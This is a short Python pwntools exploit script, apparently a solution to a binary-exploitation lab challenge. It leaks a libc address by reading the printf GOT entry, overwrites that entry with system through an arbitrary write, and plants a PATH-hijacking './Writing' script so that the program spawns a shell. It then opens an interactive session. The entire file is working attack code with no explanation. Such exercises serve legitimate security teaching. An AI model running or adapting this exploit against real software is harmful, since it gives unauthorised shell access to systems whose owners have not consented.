from pwn import *
from pathlib import Path

env = {'PATH': '.:/bin:/usr/bin'}

# set up Writing script
writing = Path('./Writing')
if not writing.exists():
    writing.write_text('#!/bin/sh\nsh')
    writing.chmod(0o0777)

elf = ELF('./7-aw1-64')
libc = elf.libc

#p = process(elf.path, env=env)
p = process(['/usr/local/pin/pin',  '-t', '/home/vxd240001/home/unit3-2/part2/obj-intel64/script.so' , '--',  elf.path], env=env)
# Leak libc with arbitrary read
p.sendlineafter(b'How many bytes do you want to read (N, in decimal)?', b'8')
p.sendlineafter(b'What is the address that you want to read (A, in hexadexmial, e.g., 0xffffde01)?', hex(elf.got['printf']).encode())

p.recvuntil(b'Reading 8 bytes from 0x602028\n')
printf_addr = u64(p.recv(8))
libc.address = printf_addr - libc.symbols['printf']

# Exploit with arbitrary write
p.sendlineafter(b'How many bytes do you want to write (N, in decimal, max 128 bytes)?', b'0')
p.sendlineafter(b'What is the address that you want to write (A, in hexadexmial, e.g., 0xffffde01)?', hex(elf.got['printf']).encode())
p.sendlineafter(b'Please provide your input (MAX 0 bytes)', p64(libc.symbols['system']), timeout=0.5)

p.interactive()
